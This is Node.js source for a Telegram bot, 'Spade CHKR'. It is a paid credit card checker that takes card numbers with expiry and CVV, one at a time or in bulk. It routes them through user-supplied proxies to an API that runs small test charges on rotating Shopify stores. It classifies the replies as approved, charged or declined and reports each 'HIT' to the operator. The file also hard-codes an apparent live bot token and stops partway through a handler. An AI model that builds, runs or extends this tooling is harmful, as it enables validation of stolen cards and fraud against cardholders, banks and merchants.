// ==========================================
// BOT CONFIG — CHANGE HERE ONLY
// ==========================================
const BOT_TOKEN = "8779574050:AAEhz51lSggRqY-h-tkHdMLF2Jw780C4oTw";
const ADMIN_ID  = 5291409360;
const BOT_NAME  = "Spade CHKR";
const WELCOME_IMG = "https://i.ibb.co/wFtyhXJY/x.jpg";
// ==========================================

const TelegramBot = require("node-telegram-bot-api");
const mongoose = require("mongoose");
const axios = require("axios");
const express = require("express");
require("dotenv").config();

const mongoUrl = process.env.MONGO_URL;
const port = process.env.PORT || 3000;

const app = express();
app.get("/", (req, res) => res.send(BOT_NAME + " is running."));
app.listen(port, "0.0.0.0", () => console.log("Server on port " + port));

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function escapeHTML(str) {
  if (!str) return "";
  return String(str).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
}
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
function getRandomItem(arr) {
  if (!arr || arr.length === 0) return null;
  return arr[Math.floor(Math.random() * arr.length)];
}

// =================== SCHEMAS ===================
const configSchema = new mongoose.Schema({
  key: { type: String, default: "main_config" },
  shopifyApiBase: { type: String, default: "https://web-production-3d364.up.railway.app/shopify" },
  shopifySites: { type: [String], default: [] },
  globalProxies: { type: [String], default: [] },
});
const Config = mongoose.models.Config || mongoose.model("Config", configSchema);

const userSchema = new mongoose.Schema({
  chatId: { type: Number, unique: true },
  firstName: String,
  joinDate: { type: Date, default: Date.now },
  credits: { type: Number, default: 0 },
  planExpiry: { type: Date, default: null },
  planName: { type: String, default: "Free" },
  totalChecked: { type: Number, default: 0 },
  totalApproved: { type: Number, default: 0 },
  totalDeclined: { type: Number, default: 0 },
  isBanned: { type: Boolean, default: false },
  proxies: { type: [String], default: [] },
});
const User = mongoose.models.User || mongoose.model("User", userSchema);

const redeemSchema = new mongoose.Schema({
  code: { type: String, unique: true },
  credits: Number, daysValid: Number, planName: String,
  isUsed: { type: Boolean, default: false }, usedBy: Number,
});
const Redeem = mongoose.models.Redeem || mongoose.model("Redeem", redeemSchema);

mongoose.connect(mongoUrl)
  .then(() => console.log("MongoDB Connected"))
  .catch(err => console.error("MongoDB Error:", err));
process.on("uncaughtException", err => console.error(err));
process.on("unhandledRejection", r => console.error(r));

const userStates = {};

// =================== HELPERS ===================
async function getUser(chatId, firstName) {
  let user = await User.findOne({ chatId });
  if (!user) user = await User.create({ chatId, firstName, credits: 0, planName: "Free" });
  if (user.planExpiry && new Date() > user.planExpiry) {
    user.credits = 0; user.planName = "Free"; user.planExpiry = null; await user.save();
  }
  return user;
}

async function deductCredits(user, amount) {
  if (user.isBanned) return false;
  if (user.credits >= amount) {
    user.credits -= amount; user.totalChecked += amount; await user.save(); return true;
  }
  return false;
}

// =================== PROXY FUNCTIONS ===================
function formatProxyToUrl(raw) {
  raw = raw.trim();
  if (!raw) return null;
  let core = raw;
  if (raw.includes("://")) core = raw.split("://").slice(1).join("://");
  if (core.includes("@")) {
    const atIdx = core.lastIndexOf("@");
    const auth = core.substring(0, atIdx);
    const hostPort = core.substring(atIdx + 1);
    const hp = hostPort.split(":");
    if (hp.length >= 2) return "http://" + auth + "@" + hp[0] + ":" + hp[1];
    return null;
  }
  const parts = core.split(":");
  if (parts.length >= 4 && !isNaN(parts[1])) {
    return "http://" + parts[2] + ":" + parts.slice(3).join(":") + "@" + parts[0] + ":" + parts[1];
  }
  if (parts.length === 2 && !isNaN(parts[1])) {
    return "http://" + parts[0] + ":" + parts[1];
  }
  return null;
}

function proxyUrlToParam(formatted) {
  try {
    const u = new URL(formatted);
    const h = u.hostname, p = u.port || "8080";
    const un = u.username, pw = u.password;
    return (un && pw) ? h+":"+p+":"+un+":"+pw : h+":"+p;
  } catch(e) { return ""; }
}

// Ultra fast proxy test — 5s timeout
async function testProxyFast(formatted) {
  try {
    const { HttpsProxyAgent } = require("https-proxy-agent");
    const agent = new HttpsProxyAgent(formatted);
    const r = await axios.get("https://api.ipify.org?format=json", {
      httpAgent: agent, httpsAgent: agent, proxy: false, timeout: 5000
    });
    return r.data && r.data.ip ? formatted : false;
  } catch(e) { return false; }
}

// Test proxies in parallel batches — ULTRA FAST
async function testProxiesBatch(proxies, batchSize = 10) {
  const results = [];
  for (let i = 0; i < proxies.length; i += batchSize) {
    const batch = proxies.slice(i, i + batchSize);
    const batchResults = await Promise.all(batch.map(p => testProxyFast(p)));
    results.push(...batchResults);
  }
  return results;
}

// Site live check — 5s timeout
async function checkSiteFast(url) {
  try {
    const r = await axios.get(url, { timeout: 5000, headers: { "User-Agent": "Mozilla/5.0" } });
    return r.status >= 200 && r.status < 500;
  } catch(e) { return false; }
}

// =================== CARD RESULT CLASSIFIER ===================
function classifyResponse(responseText, isApprovedFromAPI) {
  const r = (responseText || "").toUpperCase();

  // APPROVED responses
  const approvedKeywords = [
    "APPROVED", "CHARGED", "SUCCESS", "PAYMENT_AUTHORIZED",
    "OTP_REQUIRED", "3DS_REQUIRED", "3D_SECURE", "AUTHENTICATION_REQUIRED",
    "REDIRECT", "PENDING"
  ];

  // DECLINED responses
  const declinedKeywords = [
    "DECLINED", "INSUFFICIENT", "DO NOT HONOR", "INVALID", "EXPIRED",
    "STOLEN", "BLOCKED", "RESTRICTED", "LOST", "PICKUP", "SECURITY"
  ];

  // CHARGED responses
  const chargedKeywords = ["CHARGED", "PAYMENT_AUTHORIZED", "AMOUNT_CAPTURED"];

  let category = "declined";
  if (isApprovedFromAPI) category = "approved";

  for (const kw of approvedKeywords) {
    if (r.includes(kw)) { category = "approved"; break; }
  }
  for (const kw of chargedKeywords) {
    if (r.includes(kw)) { category = "charged"; break; }
  }
  for (const kw of declinedKeywords) {
    if (r.includes(kw)) { category = "declined"; break; }
  }

  return category;
}

// =================== PROCESS CARD ===================
async function processCard(ccInput, rawProxy) {
  let result = {
    cc: escapeHTML(ccInput),
    category: "declined",
    statusText: "DECLINED",
    responseText: "DECLINED",
    brand: "VISA", issuer: "BANK", country: "USA",
  };

  let proxyParam = "";
  if (rawProxy) {
    const fmt = formatProxyToUrl(rawProxy);
    if (fmt) proxyParam = proxyUrlToParam(fmt);
  }

  try {
    const cfg = await Config.findOne({ key: "main_config" });
    const apiBase = (cfg && cfg.shopifyApiBase) ? cfg.shopifyApiBase : "https://web-production-3d364.up.railway.app/shopify";
    const sites = (cfg && cfg.shopifySites && cfg.shopifySites.length > 0) ? cfg.shopifySites : ["https://touch-of-finland.myshopify.com"];
    const site = getRandomItem(sites);

    // CORRECT API URL FORMAT
    const apiUrl = apiBase +
      "?site=" + encodeURIComponent(site) +
      "&cc=" + ccInput.trim() +
      "&proxy=" + proxyParam;
    const res = await axios.get(apiUrl, {
      timeout: 25000,
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json",
        "Content-Type": "application/json"
      }
    });

    const data = res.data || {};
    const rawResp = data.Response || data.response || data.message || data.Message || data.status || "";
    const apiApproved = data.Status === true || data.status === "success";

    result.responseText = rawResp ? escapeHTML(rawResp) : (apiApproved ? "APPROVED" : "DECLINED");
    result.category = classifyResponse(result.responseText, apiApproved);

  } catch(err) {
    const em = (err.response && (err.response.data?.Response || err.response.data?.message))
      || err.response?.statusText || err.message || "API Error";
    result.responseText = escapeHTML(em);
    result.category = "declined";
  }

  // Status text based on category
  if (result.category === "approved") result.statusText = "APPROVED ✅";
  else if (result.category === "charged") result.statusText = "CHARGED \uD83D\uDCB3";
  else result.statusText = "DECLINED ❌";

  // BIN lookup
  const bin = ccInput.replace(/[|\\/\s-]/g, "").substring(0, 6);
  try {
    const br = await axios.get("https://lookup.binlist.net/" + bin, {
      timeout: 3000, headers: { "Accept-Version": "3" }
    });
    if (br.data) {
      result.brand = escapeHTML((br.data.scheme || "VISA").toUpperCase());
      result.issuer = escapeHTML((br.data.bank?.name || "BANK").toUpperCase());
      const cn = (br.data.country?.name || "USA").toUpperCase();
      const ce = br.data.country?.emoji || "";
      result.country = escapeHTML(cn) + " " + ce;
    }
  } catch(e) {}

  return result;
}

// =================== FORMAT RESULT ===================
function formatCardResult(data, userName, userId) {
  const si = data.category === "approved" || data.category === "charged"
    ? "<tg-emoji emoji-id=\"6138803821394009204\">\u2705</tg-emoji>"
    : "<tg-emoji emoji-id=\"5402104393396931859\">\u274C</tg-emoji>";

  return (
    si + " <b>Status</b> \u27A0 " + data.statusText + "\n" +
    "<tg-emoji emoji-id=\"5195072744798051557\">\uD83D\uDCB3</tg-emoji> <b>Card</b> \u27A0 <code>" + data.cc + "</code>\n" +
    "<tg-emoji emoji-id=\"6136204644625423818\">\u26A1</tg-emoji> <b>Gateway</b> \u27A0 Shopify 0.98 USD\n" +
    "<tg-emoji emoji-id=\"6138961691506907344\">\u2699\uFE0F</tg-emoji> <b>Response</b> \u27A0 " + data.responseText + "\n" +
    "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n" +
    "<tg-emoji emoji-id=\"6159080241739342919\">\uD83C\uDFE6</tg-emoji> <b>Brand</b> \u27A0 " + data.brand + "\n" +
    "<tg-emoji emoji-id=\"6159080241739342919\">\uD83C\uDFDB</tg-emoji> <b>Issuer</b> \u27A0 " + data.issuer + "\n" +
    "<tg-emoji emoji-id=\"4956560549287560231\">\uD83C\uDF0D</tg-emoji> <b>Country</b> \u27A0 " + data.country + "\n" +
    "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n" +
    "<tg-emoji emoji-id=\"4956461073550017373\">\uD83D\uDC64</tg-emoji> <b>User</b> \u27A0 <a href=\"tg://user?id=" + userId + "\">" + escapeHTML(userName || "User") + "</a>\n" +
    "<tg-emoji emoji-id=\"4956420911310832630\">\uD83D\uDC8E</tg-emoji> <b>Dev</b> \u27A0 @ZeroSpade"
  );
}

// Result keyboard with colored buttons
function getResultKeyboard(category) {
  if (category === "approved") {
    return { inline_keyboard: [[{ text: "✅ APPROVED", callback_data: "noop" }]] };
  } else if (category === "charged") {
    return { inline_keyboard: [[{ text: "💙 CHARGED", callback_data: "noop" }]] };
  } else {
    return { inline_keyboard: [[{ text: "🔴 DECLINED", callback_data: "noop" }]] };
  }
}

// =================== WELCOME ===================
function sendUserHome(chatId) {
  const caption =
    "<tg-emoji emoji-id=\"6138869285285537620\">\u2660\uFE0F</tg-emoji> <b>WELCOME TO " + escapeHTML(BOT_NAME) + "</b>\n" +
    "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n" +
    "<tg-emoji emoji-id=\"6138532229137049159\">\uD83D\uDD25</tg-emoji> WHERE LEGENDS BURN THROUGH FIRE <tg-emoji emoji-id=\"6253483549890973859\">\uD83D\uDD25</tg-emoji>\n" +
    "Got Your Full Value Here\n" +
    "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n" +
    "<tg-emoji emoji-id=\"5258332798409783582\">\u2699\uFE0F</tg-emoji> Version ~ v1.0\n" +
    "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n" +
    "<tg-emoji emoji-id=\"6136205108481890460\">\uD83D\uDC51</tg-emoji> Dev ~ <a href=\"https://t.me/ZeroSpade\">Spade Minister</a>";
  const keyboard = { inline_keyboard: [
    [{ text: "Gates", callback_data: "gate_menu", icon_custom_emoji_id: "6136316288005314906" },
     { text: "Mass", callback_data: "mass_menu", icon_custom_emoji_id: "6138728977293907990" }],
    [{ text: "Profile", callback_data: "profile_menu", icon_custom_emoji_id: "6136250085379413636" },
     { text: "Tools", callback_data: "tools_menu", icon_custom_emoji_id: "6138961691506907344" }],
    [{ text: "Pricing", callback_data: "pricing_menu", icon_custom_emoji_id: "5424976816530014958" },
     { text: "Owner", url: "https://t.me/ZeroSpade", icon_custom_emoji_id: "6136665868278438410" }],
  ]};
  bot.sendPhoto(chatId, WELCOME_IMG, { caption, parse_mode: "HTML", reply_markup: keyboard })
    .catch(() => bot.sendMessage(chatId, caption, { parse_mode: "HTML", reply_markup: keyboard }));
}

// =================== /start ===================
bot.onText(/^\/start/, async (msg) => {
  delete userStates[msg.chat.id];
  await getUser(msg.chat.id, msg.from.first_name);
  if (msg.chat.id === ADMIN_ID) {
    return bot.sendMessage(msg.chat.id,
      "<tg-emoji emoji-id=\"5215399540814781035\">\uD83D\uDC51</tg-emoji> <b>ADMIN PANEL</b>\n\nWelcome back, Developer!",
      { parse_mode: "HTML", reply_markup: { inline_keyboard: [
        [{ text: "Users List", callback_data: "admin_users_list" }],
        [{ text: "Manage Users", callback_data: "admin_manage_users" }, { text: "Broadcast", callback_data: "admin_broadcast" }],
        [{ text: "Generate Redeem", callback_data: "admin_gen_redeem" }],
        [{ text: "User Menu", callback_data: "admin_user_menu" }],
      ]}});
  }
  sendUserHome(msg.chat.id);
});

// =================== SITE FUNCTIONS ===================
function parseSites(text) {
  return text.split(/[\n,]+/).map(s => s.trim()).filter(s => s.startsWith("http"));
}

async function processSiteAdd(chatId, text) {
  const candidates = parseSites(text);
  if (candidates.length === 0) return bot.sendMessage(chatId, "\u274C No valid URLs found. Must start with https://");
  const statusMsg = await bot.sendMessage(chatId,
    "<tg-emoji emoji-id=\"5213452215527677338\">\u23F3</tg-emoji> <b>Checking " + candidates.length + " sites...</b>",
    { parse_mode: "HTML" });
  const cfg = await Config.findOne({ key: "main_config" });
  const existing = (cfg && cfg.shopifySites) ? cfg.shopifySites : [];
  let added = 0, dead = 0, duplicate = 0;
  const newSites = [...existing];
  // Check sites in parallel
  const checks = await Promise.all(candidates.map(s => checkSiteFast(s)));
  candidates.forEach((site, i) => {
    if (existing.includes(site)) { duplicate++; return; }
    if (checks[i]) { newSites.push(site); added++; }
    else { dead++; }
  });
  await Config.findOneAndUpdate({ key: "main_config" }, { shopifySites: newSites }, { upsert: true });
  bot.editMessageText(
    "<tg-emoji emoji-id=\"6138803821394009204\">\u2705</tg-emoji> <b>Sites Updated!</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\u2705 Added: " + added + "\n\u274C Dead: " + dead + "\n\uD83D\uDD04 Duplicate: " + duplicate + "\n\uD83C\uDFE6 Total: " + newSites.length,
    { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML" }
  );
}

// =================== /addsite ===================
bot.onText(/^\/addsite(?:\s*(.*))?/, async (msg, match) => {
  if (msg.chat.id !== ADMIN_ID) return;
  let text = match[1] ? match[1].trim() : "";
  if (msg.reply_to_message) {
    if (msg.reply_to_message.text) text = msg.reply_to_message.text;
    else if (msg.reply_to_message.document) {
      try { const fl = await bot.getFileLink(msg.reply_to_message.document.file_id); text = (await axios.get(fl)).data; } catch(e) {}
    }
  }
  if (!text.trim()) {
    userStates[msg.chat.id] = "WAITING_ADDSITE";
    return bot.sendMessage(msg.chat.id,
      "<tg-emoji emoji-id=\"6138961691506907344\">\u2699\uFE0F</tg-emoji> <b>Send sites (one per line) or .txt file:</b>\n<code>https://site1.myshopify.com\nhttps://site2.myshopify.com</code>",
      { parse_mode: "HTML" });
  }
  await processSiteAdd(msg.chat.id, text);
});

// =================== /checksites ===================
bot.onText(/^\/checksites/, async (msg) => {
  if (msg.chat.id !== ADMIN_ID) return;
  const cfg = await Config.findOne({ key: "main_config" });
  const sites = (cfg && cfg.shopifySites) ? cfg.shopifySites : [];
  if (sites.length === 0) return bot.sendMessage(msg.chat.id, "\u274C No sites added yet.");
  const statusMsg = await bot.sendMessage(msg.chat.id,
    "<tg-emoji emoji-id=\"5213452215527677338\">\u23F3</tg-emoji> <b>Checking " + sites.length + " sites...</b>",
    { parse_mode: "HTML" });
  const checks = await Promise.all(sites.map(s => checkSiteFast(s)));
  let live = [], dead = [];
  sites.forEach((s, i) => { if (checks[i]) live.push(s); else dead.push(s); });
  let txt = "<tg-emoji emoji-id=\"6138961691506907344\">\u2699\uFE0F</tg-emoji> <b>SITES STATUS</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\u2705 <b>Live (" + live.length + "):</b>\n";
  live.forEach((s,i) => { txt += (i+1)+". <code>"+s+"</code>\n"; });
  txt += "\n\u274C <b>Dead (" + dead.length + ")</b>";
  if (dead.length > 0) dead.forEach((s,i) => { txt += "\n"+(i+1)+". <code>"+s+"</code>"; });
  bot.editMessageText(txt, { chat_id: msg.chat.id, message_id: statusMsg.message_id, parse_mode: "HTML" });
});

// =================== /clearsites ===================
bot.onText(/^\/clearsites/, async (msg) => {
  if (msg.chat.id !== ADMIN_ID) return;
  await Config.findOneAndUpdate({ key: "main_config" }, { shopifySites: [] }, { upsert: true });
  bot.sendMessage(msg.chat.id, "<tg-emoji emoji-id=\"6138803821394009204\">\u2705</tg-emoji> All sites cleared!", { parse_mode: "HTML" });
});

// =================== PROXY FUNCTIONS ===================
function parseProxies(text) {
  return text.split(/\n+/).map(s => s.trim()).filter(s => s.length > 5);
}

async function processProxyAdd(chatId, text) {
  const candidates = parseProxies(text);
  if (candidates.length === 0) return bot.sendMessage(chatId, "\u274C No proxies found.");
  const isAdmin = chatId === ADMIN_ID;
  // Check limit BEFORE testing
  if (!isAdmin) {
    const user = await User.findOne({ chatId });
    const currentCount = (user && user.proxies) ? user.proxies.length : 0;
    if (currentCount >= 20) {
      return bot.sendMessage(chatId,
        "<tg-emoji emoji-id=\"5402104393396931859\">\u274C</tg-emoji> <b>Maximum limit reached!</b>\nYou already have 20 proxies.\nUse /clearproxy to remove first.",
        { parse_mode: "HTML" });
    }
  }
  const statusMsg = await bot.sendMessage(chatId,
    "<tg-emoji emoji-id=\"5213452215527677338\">\u23F3</tg-emoji> <b>Testing " + candidates.length + " proxies... (Ultra Fast)</b>",
    { parse_mode: "HTML" });

  // Format all proxies first
  const formatted = candidates.map(r => formatProxyToUrl(r)).filter(f => f !== null);
  // Test ALL in parallel — ULTRA FAST
  const results = await testProxiesBatch(formatted, 15);

  let liveProxies = formatted.filter((f, i) => results[i] !== false);
  let added = 0, dead = candidates.length - formatted.length + formatted.filter((f,i) => !results[i]).length, duplicate = 0;

  if (isAdmin) {
    const cfg = await Config.findOne({ key: "main_config" });
    const existing = (cfg && cfg.globalProxies) ? cfg.globalProxies : [];
    const newProxies = [...existing];
    liveProxies.forEach(p => {
      if (existing.includes(p)) { duplicate++; }
      else { newProxies.push(p); added++; }
    });
    await Config.findOneAndUpdate({ key: "main_config" }, { globalProxies: newProxies }, { upsert: true });
    bot.editMessageText(
      "<tg-emoji emoji-id=\"6138803821394009204\">\u2705</tg-emoji> <b>Proxies Updated!</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\u2705 Live Added: " + added + "\n\u274C Dead/Invalid: " + dead + "\n\uD83D\uDD04 Duplicate: " + duplicate + "\n\uD83C\uDF10 Total Global: " + newProxies.length,
      { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML" }
    );
  } else {
    const user = await User.findOne({ chatId });
    const existing = user.proxies || [];
    liveProxies.forEach(p => {
      if (user.proxies.length >= 20) return;
      if (existing.includes(p)) { duplicate++; }
      else { user.proxies.push(p); added++; }
    });
    await user.save();
    bot.editMessageText(
      "<tg-emoji emoji-id=\"6138803821394009204\">\u2705</tg-emoji> <b>Proxies Added!</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\u2705 Live Added: " + added + "\n\u274C Dead/Invalid: " + dead + "\n\uD83D\uDD04 Duplicate: " + duplicate + "\n\uD83C\uDF10 Your Total: " + user.proxies.length + "/20",
      { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML" }
    );
  }
}

// =================== /addproxy ===================
bot.onText(/^\/addproxy(?:\s*(.*))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  await getUser(chatId, msg.from.first_name);
  // Check limit first
  if (chatId !== ADMIN_ID) {
    const user = await User.findOne({ chatId });
    if (user && user.proxies && user.proxies.length >= 20) {
      return bot.sendMessage(chatId,
        "<tg-emoji emoji-id=\"5402104393396931859\">\u274C</tg-emoji> <b>Maximum 20 proxies allowed!</b>\nUse /clearproxy first.",
        { parse_mode: "HTML" });
    }
  }
  let text = match[1] ? match[1].trim() : "";
  if (msg.reply_to_message) {
    if (msg.reply_to_message.text) text = msg.reply_to_message.text;
    else if (msg.reply_to_message.document) {
      try { const fl = await bot.getFileLink(msg.reply_to_message.document.file_id); text = (await axios.get(fl)).data; } catch(e) {}
    }
  }
  if (!text.trim()) {
    userStates[chatId] = "WAITING_ADDPROXY";
    return bot.sendMessage(chatId,
      "<tg-emoji emoji-id=\"6138961691506907344\">\u2699\uFE0F</tg-emoji> <b>Send proxies (one per line) or .txt file:</b>\n\n<i>Formats supported:\nhost:port\nhost:port:user:pass\nuser:pass@host:port</i>",
      { parse_mode: "HTML" });
  }
  await processProxyAdd(chatId, text);
});

// =================== /checkproxy ===================
bot.onText(/^\/checkproxy/, async (msg) => {
  const chatId = msg.chat.id;
  let proxies = [];
  if (chatId === ADMIN_ID) {
    const cfg = await Config.findOne({ key: "main_config" });
    proxies = (cfg && cfg.globalProxies) ? cfg.globalProxies : [];
  } else {
    const user = await getUser(chatId, msg.from.first_name);
    proxies = user.proxies || [];
  }
  if (proxies.length === 0) return bot.sendMessage(chatId, "\u274C No proxies added yet. Use /addproxy");
  const statusMsg = await bot.sendMessage(chatId,
    "<tg-emoji emoji-id=\"5213452215527677338\">\u23F3</tg-emoji> <b>Checking " + proxies.length + " proxies... (Ultra Fast)</b>",
    { parse_mode: "HTML" });
  const results = await testProxiesBatch(proxies, 15);
  let live = [], dead = [];
  proxies.forEach((p, i) => { if (results[i]) live.push(p); else dead.push(p); });
  let txt = "<tg-emoji emoji-id=\"6138961691506907344\">\u2699\uFE0F</tg-emoji> <b>PROXY STATUS</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\u2705 <b>Live (" + live.length + "):</b>\n";
  live.forEach((p,i) => {
    let d=p; try{const pts=p.split("://");if(pts.length===2){const ah=pts[1].split("@");if(ah.length===2){const up=ah[0].split(":");d=pts[0]+"://"+up[0]+":***@"+ah[1];}}}catch(e){}
    txt += (i+1)+". <code>"+d+"</code>\n";
  });
  txt += "\n\u274C <b>Dead (" + dead.length + ")</b>";
  bot.editMessageText(txt, { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML" });
});

// =================== /clearproxy ===================
bot.onText(/^\/clearproxy/, async (msg) => {
  const chatId = msg.chat.id;
  if (chatId === ADMIN_ID) {
    await Config.findOneAndUpdate({ key: "main_config" }, { globalProxies: [] }, { upsert: true });
    return bot.sendMessage(chatId, "<tg-emoji emoji-id=\"6138803821394009204\">\u2705</tg-emoji> All global proxies cleared!", { parse_mode: "HTML" });
  }
  const user = await getUser(chatId, msg.from.first_name);
  user.proxies = []; await user.save();
  bot.sendMessage(chatId, "<tg-emoji emoji-id=\"6138803821394009204\">\u2705</tg-emoji> Your proxies cleared!", { parse_mode: "HTML" });
});

// =================== /myproxy ===================
bot.onText(/^\/myproxy/, async (msg) => {
  const chatId = msg.chat.id;
  const user = await getUser(chatId, msg.from.first_name);
  if (!user.proxies || user.proxies.length === 0) return bot.sendMessage(chatId, "\u26A0\uFE0F No proxies. Use /addproxy");
  const pList = user.proxies.map((p,i) => {
    let d=p; try{const pts=p.split("://");if(pts.length===2){const ah=pts[1].split("@");if(ah.length===2){const up=ah[0].split(":");d=pts[0]+"://"+up[0]+":***@"+ah[1];}}}catch(e){}
    return (i+1)+". <code>"+d+"</code>";
  }).join("\n");
  bot.sendMessage(chatId, "\uD83D\uDEE0 <b>YOUR PROXIES ["+user.proxies.length+"/20]</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"+pList+"\n\n<i>/clearproxy to remove all</i>", { parse_mode: "HTML" });
});

// =================== /changeshopifyapi ===================
bot.onText(/^\/changeshopifyapi (.+)/, async (msg, match) => {
  try {
    if (msg.chat.id !== ADMIN_ID) return;
    const fullUrl = match[1].trim();
    let apiBase = "";
    try {
      const urlObj = new URL(fullUrl);
      apiBase = urlObj.origin + urlObj.pathname;
    } catch(e) {
      const bm = fullUrl.match(/^(https?:\/\/[^?]+)/);
      if (bm) apiBase = bm[1];
    }
    if (!apiBase) return bot.sendMessage(msg.chat.id, "\u274C Invalid URL.");
    await Config.findOneAndUpdate({ key: "main_config" }, { shopifyApiBase: apiBase }, { upsert: true });
    bot.sendMessage(msg.chat.id, "\u2705 <b>API Updated!</b>\n\uD83D\uDD17 <code>" + escapeHTML(apiBase) + "</code>", { parse_mode: "HTML" });
  } catch(e) { bot.sendMessage(msg.chat.id, "\u274C Error: " + e.message); }
});

// =================== /sh ===================
bot.onText(/^\/sh(?: (.+))?/, async (msg, match) => {
  delete userStates[msg.chat.id];
  const chatId = msg.chat.id;
  const user = await getUser(chatId, msg.from.first_name);
  if (user.isBanned) return bot.sendMessage(chatId, "<tg-emoji emoji-id=\"5402104393396931859\">\u26D4</tg-emoji> You are blocked.", { parse_mode: "HTML" });
  if (!match || !match[1]) return bot.sendMessage(chatId, "<tg-emoji emoji-id=\"5402104393396931859\">\u26A0\uFE0F</tg-emoji> Format: <code>/sh cc|mm|yy|cvv</code>", { parse_mode: "HTML" });
  if (!(await deductCredits(user, 1))) return bot.sendMessage(chatId, "<tg-emoji emoji-id=\"5195072744798051557\">\uD83D\uDCB3</tg-emoji> <b>Not enough credits!</b>\nUse /redeem CODE", { parse_mode: "HTML" });
  const ccInput = match[1].trim();
  const proxy = getRandomItem(user.proxies);
  const pm = await bot.sendMessage(chatId,
    "<tg-emoji emoji-id=\"5213452215527677338\">\u23F3</tg-emoji> <b>PROCESSING...</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n<tg-emoji emoji-id=\"5195072744798051557\">\uD83D\uDCB3</tg-emoji> <b>Card:</b> <code>"+escapeHTML(ccInput)+"</code>\n<tg-emoji emoji-id=\"6136204644625423818\">\u26A1</tg-emoji> <b>Gate:</b> Shopify 0.98$\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
    { parse_mode: "HTML" });
  const cardData = await processCard(ccInput, proxy);
  if (cardData.category === "approved" || cardData.category === "charged") user.totalApproved++;
  else user.totalDeclined++;
  await user.save();
  const fm = formatCardResult(cardData, msg.from.first_name, msg.from.id);
  const keyboard = getResultKeyboard(cardData.category);
  await bot.editMessageText(fm, {
    chat_id: chatId, message_id: pm.message_id,
    parse_mode: "HTML", disable_web_page_preview: true,
    reply_markup: keyboard
  });
  if ((cardData.category === "approved" || cardData.category === "charged") && chatId !== ADMIN_ID) {
    bot.sendMessage(ADMIN_ID,
      "\uD83D\uDFE2 <b>HIT!</b> By: <a href=\"tg://user?id="+chatId+"\">"+escapeHTML(msg.from.first_name)+"</a>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"+fm,
      { parse_mode: "HTML", disable_web_page_preview: true });
  }
});

// =================== /shmt ===================
bot.onText(/^\/shmt/, async (msg) => {
  userStates[msg.chat.id] = "WAITING_TXT";
  bot.sendMessage(msg.chat.id,
    "<tg-emoji emoji-id=\"6138961691506907344\">\u2699\uFE0F</tg-emoji> <b>Send your .txt file.</b>\n<i>One CC per line</i>",
    { parse_mode: "HTML" });
});

// =================== /redeem ===================
bot.onText(/^\/redeem (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const code = match[1].trim();
  const rd = await Redeem.findOne({ code });
  if (!rd) return bot.sendMessage(chatId, "\u274C Invalid Redeem Code.");
  if (rd.isUsed) return bot.sendMessage(chatId, "\u274C Code Already Redeemed.");
  rd.isUsed = true; rd.usedBy = chatId; await rd.save();
  const user = await getUser(chatId, msg.from.first_name);
  user.credits += rd.credits; user.planName = rd.planName;
  const endD = new Date(); endD.setDate(endD.getDate() + rd.daysValid);
  user.planExpiry = endD; await user.save();
  bot.sendMessage(chatId,
    "<tg-emoji emoji-id=\"6255910936557653676\">\uD83E\uDD1D</tg-emoji> <b>Redeem Successful!</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n<tg-emoji emoji-id=\"4956420911310832630\">\uD83D\uDC8E</tg-emoji> <b>Credits:</b> "+rd.credits+"\n<tg-emoji emoji-id=\"5213452215527677338\">\u23F3</tg-emoji> <b>Valid:</b> "+rd.daysValid+" Days\n<tg-emoji emoji-id=\"5215399540814781035\">\uD83D\uDC51</tg-emoji> <b>Plan:</b> "+rd.planName+"\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n<i>Enjoy!</i>",
    { parse_mode: "HTML" });
});

// =================== CALLBACKS ===================
bot.on("callback_query", async (cb) => {
  const chatId = cb.message.chat.id;
  const msgId = cb.message.message_id;
  if (cb.data === "noop") { bot.answerCallbackQuery(cb.id).catch(() => {}); return; }
  try {
    if (cb.data === "admin_user_menu") { sendUserHome(chatId); }
